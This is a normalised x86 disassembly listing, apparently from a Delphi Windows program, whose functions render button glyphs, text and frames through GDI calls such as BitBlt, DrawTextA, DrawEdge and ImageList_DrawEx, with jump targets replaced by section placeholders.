mov eax ebx
call sub_42a2bc
cmp [ ebx + 0x2a ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_42a330
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_42a2bc
mov edx ebx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_421720
mov [ esi + 0x1c ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
pop edx
xchg edx eax
mov ecx edx
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
pop edx
xchg edx eax
mov ecx edx
cdq
idiv ecx
cmp eax 0x4
jle r-xdata
mov edx eax
mov eax esi
call sub_42a3a8
mov eax 0x1
sub_42a3a8
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20 ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
jbe r-xdata
mov eax esi
call sub_42a2bc
mov [ esi + 0x20 ] bl
mov edx [ esi + 0x4 ]
mov eax esi
call sub_42a300
sub_42a3d0
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x2
jne r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov ebx [ edx + eax * 4 + 0xc ]
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x3
jae r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
or esi eax
je r-xdata
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x20 ]
mov ecx edx
cdq
idiv ecx
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov esi eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42106c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42a97f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx esi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push esi
lea eax [ ebp - 0x28 ]
push eax
mov ecx edi
xor edx edx
xor eax eax
call sub_412484
mov eax [ ebp - 0xc ]
call sub_421634
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41cd48
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
call sub_420dfc
mov edx eax
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov bl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x20 ]
jl r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x38 ]
push eax
xor ecx ecx
mov cl bl
inc ecx
imul ecx edi
xor eax eax
mov al bl
imul edi
xor edx edx
call sub_412484
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
xor ebx ebx
mov ecx esi
mov edx edi
mov eax [ rw-data ]
call sub_42a13c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a0c8
mov [ rw-data ] eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_421634
push eax
mov eax [ ebp - 0xc ]
call sub_421634
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41cfb8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x38 ] 0x1
jne r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov ecx 0x20000000
mov edx [ ebp - 0xc ]
call sub_42a06c
xor edx edx
mov dl [ ebp - 0x5 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_42a06c
xor edx edx
mov dl [ ebp - 0x5 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_42a943
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42106c
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42106c
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
jbe r-xdata
dec eax
sub al 0x2
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403128
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x14 ]
call sub_421634
mov eax [ eax + 0x14 ]
xor edx edx
call sub_41cd48
mov edx edi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x14 ]
call sub_4216f0
test al al
je r-xdata
mov eax [ ebp - 0xc ]
call sub_421634
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_421634
mov ecx eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_41cfb8
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_4223a4
mov edx edi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x10 ]
call sub_421634
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_41cd48
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_421634
push eax
mov eax [ ebp - 0x14 ]
call sub_421634
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41cfb8
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff000014
call sub_41cd48
mov eax [ ebp - 0x18 ]
call sub_41d4a0
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_421634
call sub_41d4a0
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
mov eax [ ebp - 0x10 ]
call sub_421634
mov eax [ eax + 0x14 ]
mov edx 0x808080
call sub_41cd48
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_421634
push eax
mov eax [ ebp - 0x14 ]
call sub_421634
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41cfb8
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff000010
call sub_41cd48
mov eax [ ebp - 0x18 ]
call sub_41d4a0
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_421634
call sub_41d4a0
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_41c09c
push eax
mov eax [ ebp - 0x10 ]
call sub_421634
mov eax [ eax + 0x14 ]
pop edx
call sub_41cd48
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_421634
push eax
mov eax [ ebp - 0x14 ]
call sub_421634
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41cfb8
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41cd48
mov eax [ ebp - 0x18 ]
call sub_41d4a0
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_421634
call sub_41d4a0
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_4223a4
mov eax [ ebp - 0xc ]
call sub_421634
mov ebx eax
mov eax [ ebx + 0x14 ]
mov edx 0xff00000f
call sub_41cd48
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_41d120
mov eax [ ebx + 0x14 ]
mov edx 0xff000014
call sub_41cd48
push 0x0
mov eax ebx
call sub_41d4a0
push eax
call SetTextColor
push 0xffffff
mov eax ebx
call sub_41d4a0
push eax
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_421634
call sub_41d4a0
push eax
push esi
push edi
push 0x1
push 0x1
mov eax ebx
call sub_41d4a0
push eax
call BitBlt
mov eax [ ebx + 0x14 ]
mov edx 0xff000010
call sub_41cd48
push 0x0
mov eax ebx
call sub_41d4a0
push eax
call SetTextColor
push 0xffffff
mov eax ebx
call sub_41d4a0
push eax
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_421634
call sub_41d4a0
push eax
push esi
push edi
push 0x0
push 0x0
mov eax ebx
call sub_41d4a0
push eax
call BitBlt
mov eax [ ebp - 0x14 ]
call sub_421634
mov eax [ eax + 0xc ]
mov edx 0xffffff
call sub_41c55c
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_4223a4
mov eax [ ebp - 0x14 ]
call sub_421634
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_41cd48
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403128
mov eax [ ebp - 0x14 ]
call sub_403128
retn
sub_42a9a8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov ebx [ ebp + 0xc ]
cmp [ edi + 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
je r-xdata
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
je r-xdata
mov edx ebx
mov eax edi
call sub_42a3d0
mov esi eax
call sub_42c460
call sub_42c540
test al al
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x24 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0x20 ] edx
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
xor edx edx
mov dl [ edi + 0x20 ]
mov ecx edx
cdq
idiv ecx
add eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
dec bl
je r-xdata
push 0x1
push 0x1fffffff
push 0x1fffffff
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41d4a0
push eax
push esi
mov eax [ edi + 0x8 ]
call sub_441f38
push eax
call ImageList_DrawEx
jmp r-xdata
cmp bl 0x3
jne r-xdata
mov bl 0x5
jmp r-xdata
dec ebx
sub bl 0x2
jb r-xdata
push 0x0
push 0x1fffffff
mov eax 0xff00000f
call sub_41c09c
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41d4a0
push eax
push esi
mov eax [ edi + 0x8 ]
call sub_441f38
push eax
call ImageList_DrawEx
call sub_42c460
lea ecx [ ebp - 0x14 ]
mov edx ebx
call sub_42c740
lea eax [ ebp - 0x24 ]
push eax
mov eax [ edi + 0x8 ]
call sub_441f38
push eax
push esi
mov eax [ ebp - 0x4 ]
call sub_41d4a0
push eax
call sub_42c460
lea ecx [ ebp - 0x14 ]
pop edx
call sub_42c690
jmp r-xdata
mov bl 0x4
jmp r-xdata
jmp r-xdata
mov bl 0x2
sub_42ab0c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov ebx edx
mov edi [ ebp + 0x8 ]
mov dl 0x1
mov eax [ ebx + 0x14 ]
call sub_41ce64
cmp [ ebp + 0xc ] 0x1
jne r-xdata
or edi 0x5
push edi
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_404138
push eax
mov eax esi
call sub_404338
push eax
mov eax ebx
call sub_41d4a0
push eax
call DrawTextA
push 0x1
push 0x1
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov edx 0xff000014
mov eax [ ebx + 0xc ]
call sub_41c55c
mov eax edi
or eax 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_404138
push eax
mov eax esi
call sub_404338
push eax
mov eax ebx
call sub_41d4a0
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ ebx + 0xc ]
call sub_41c55c
or edi 0x5
push edi
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_404138
push eax
mov eax esi
call sub_404338
push eax
mov eax ebx
call sub_41d4a0
push eax
call DrawTextA
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_42abec
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
and eax 0x2
cmp eax 0x2
jne r-xdata
mov edx [ ebx + 0xc ]
sub edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
sub eax [ ebx ]
lea ecx [ ebp - 0x18 ]
call sub_41245c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_41245c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x20 ]
mov ecx edx
cdq
idiv ecx
lea ecx [ ebp - 0x20 ]
pop edx
call sub_41245c
jmp r-xdata
cmp [ ebp + 0x1c ] 0x1
jne r-xdata
mov [ ebp + 0x1c ] 0x1
jmp r-xdata
push 0x0
lea eax [ ebp - 0x40 ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_412484
push esi
push edi
lea esi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea ecx [ ebp - 0x28 ]
xor edx edx
xor eax eax
call sub_41245c
push 0x0
lea eax [ ebp - 0x40 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
xor edx edx
xor eax eax
call sub_412484
push esi
push edi
lea esi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ ebp + 0x8 ]
or eax 0x400
push eax
push edi
mov eax [ ebp + 0x20 ]
call sub_404138
push eax
mov eax [ ebp + 0x20 ]
call sub_404338
push eax
mov eax [ ebp - 0x8 ]
call sub_41d4a0
push eax
call DrawTextA
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
mov eax [ edi + 0x8 ]
sub eax [ edi ]
lea ecx [ ebp - 0x28 ]
call sub_41245c
jmp r-xdata
mov eax [ ebp + 0x20 ]
call sub_404138
test eax eax
jle r-xdata
mov [ ebp + 0x1c ] 0x0
mov eax [ ebp - 0x18 ]
mov edx eax
sub edx [ ebp - 0x20 ]
inc edx
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
sub edx [ ebp - 0x1c ]
inc edx
sar edx 0x1
jns r-xdata
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
mov [ esi ] edx
sub eax [ ebp - 0x28 ]
inc eax
sar eax 0x1
jns r-xdata
adc edx 0x0
mov [ esi + 0x4 ] edx
sub eax [ ebp - 0x24 ]
inc eax
sar eax 0x1
jns r-xdata
adc edx 0x0
mov [ ebp - 0x10 ] eax
adc eax 0x0
mov [ ebp - 0xc ] eax
jmp r-xdata
adc eax 0x0
xor eax eax
mov [ ebp + 0x14 ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
cmp [ ebp + 0x18 ] 0xffffffff
jne r-xdata
mov al [ ebp + 0x1c ]
sub al 0x1
jb r-xdata
mov eax [ ebp + 0x18 ]
add eax [ ebp - 0x1c ]
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x18 ]
add eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
pop ecx
sub eax ecx
lea ecx [ ebp - 0x30 ]
call sub_41245c
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
add edx [ ebp + 0x14 ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
add eax [ ebp + 0x14 ]
add eax [ ebp - 0x28 ]
call sub_41245c
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x28 ]
call sub_41245c
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x18 ]
mov [ esi ] eax
add eax [ ebp - 0x20 ]
add eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x2c ]
sub eax [ ebp - 0x24 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x30 ]
sub eax [ ebp - 0x28 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x2c ]
inc eax
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x30 ]
inc eax
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x2c ]
mov ecx 0x3
cdq
idiv ecx
mov [ ebp + 0x18 ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x30 ]
mov ecx 0x3
cdq
idiv ecx
mov [ ebp + 0x18 ] eax
jmp r-xdata
mov eax [ ebx ]
mov edx [ ebp + 0x24 ]
add eax [ edx ]
add [ esi ] eax
mov eax [ ebx + 0x4 ]
mov edx [ ebp + 0x24 ]
add eax [ edx + 0x4 ]
add [ esi + 0x4 ] eax
call sub_42c460
call sub_42c540
test al al
je r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp + 0x18 ]
sub eax [ ebp - 0x20 ]
mov [ esi ] eax
sub eax [ ebp + 0x14 ]
sub eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec al
je r-xdata
mov [ ebp + 0x14 ] eax
adc eax 0x0
mov [ ebp + 0x14 ] eax
jmp r-xdata
adc eax 0x0
mov [ ebp + 0x18 ] eax
jmp r-xdata
adc eax 0x0
mov [ ebp + 0x18 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
add eax [ ebp - 0xc ]
mov edx [ ebp + 0x24 ]
add eax [ edx + 0x4 ]
push eax
mov eax [ ebx ]
add eax [ ebp - 0x10 ]
mov edx [ ebp + 0x24 ]
add eax [ edx ]
push eax
push edi
call OffsetRect
mov eax [ ebx + 0x4 ]
add eax [ ebp - 0xc ]
push eax
mov eax [ ebx ]
add eax [ ebp - 0x10 ]
push eax
push edi
call OffsetRect
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov [ esi + 0x4 ] eax
add eax [ ebp - 0x1c ]
add eax [ ebp + 0x14 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov eax [ ebp - 0x14 ]
sub eax [ ebp + 0x18 ]
sub eax [ ebp - 0x1c ]
mov [ esi + 0x4 ] eax
sub eax [ ebp + 0x14 ]
sub eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
sub_42af18
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x24 ]
mov eax [ ebp + 0x28 ]
push eax
push edi
mov al [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x18 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_42abec
mov al [ ebp + 0x14 ]
push eax
mov al [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
call sub_42a9a8
mov eax [ ebp + 0x8 ]
push eax
mov al [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_42ab0c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_42af88
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4338f8
mov eax esi
mov edx [ r-xdata ]
call sub_4032d8
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_42afac
push ebx
mov ebx eax
mov eax ebx
call sub_44115c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x20 ]
cmp [ eax + 0x168 ] 0x0
je r-xdata
mov eax [ ebx + 0x20 ]
cmp [ eax + 0x172 ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x20 ]
cmp al [ edx + 0x170 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_42aff8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x20 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov eax [ eax + 0x6c ]
cmp eax [ esi + 0x168 ]
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_42b028
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x20 ]
call sub_42b8d8
sub_42b048
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x20 ]
call sub_42b964
sub_42b068
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a1cc
mov [ ebx + 0x16c ] eax
mov eax [ ebx + 0x16c ]
mov [ eax + 0x2c ] ebx
mov [ eax + 0x28 ] sub_42b898
mov ecx esi
xor edx edx
mov eax ebx
call sub_43c594
push 0x17
push 0x16
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax ebx
call sub_434ce0
mov edx 0xff00000f
mov eax ebx
call sub_434d54
mov [ ebx + 0x174 ] 0x4
mov [ ebx + 0x17c ] 0xffffffff
mov [ ebx + 0x173 ] 0x0
mov [ ebx + 0x178 ] 0x1
inc [ rw-data ]
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_42b128
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
dec [ rw-data ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43c5f0
mov eax [ esi + 0x16c ]
call sub_403128
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_42b160
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x3c ] edx
mov esi eax
xor eax eax
push ebp
push sub_42b58a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
cmp [ esi + 0x182 ] 0x1
jne r-xdata
mov [ esi + 0x182 ] 0x1
mov [ esi + 0x171 ] 0x0
jmp r-xdata
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x160 ]
call sub_41d39c
call sub_42c460
call sub_42c540
test al al
je r-xdata
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov eax [ esi + 0x4c ]
push eax
lea eax [ ebp - 0x19 ]
push eax
mov ecx [ esi + 0x48 ]
xor edx edx
xor eax eax
call sub_412484
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_41d4a0
mov edx eax
mov eax esi
call sub_431d08
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov [ esi + 0x182 ] 0x0
cmp [ esi + 0x168 ] 0x0
je r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jb r-xdata
mov ebx 0x2010
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov [ ebp - 0x9 ] 0x5
jmp r-xdata
mov [ esi + 0x182 ] 0x3
jmp r-xdata
xor eax eax
mov al [ esi + 0x178 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xf
push eax
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
setb al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
push eax
lea eax [ ebp - 0x19 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41d4a0
push eax
call DrawEdge
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
je r-xdata
push ebx
push 0x4
lea eax [ ebp - 0x19 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41d4a0
push eax
call DrawFrameControl
jmp r-xdata
or ebx 0x200
cmp [ esi + 0x181 ] 0x0
je r-xdata
mov [ ebp - 0x9 ] 0x4
jmp r-xdata
xor ebx ebx
cmp [ esi + 0x180 ] 0x0
je r-xdata
push 0xffffffff
push 0xffffffff
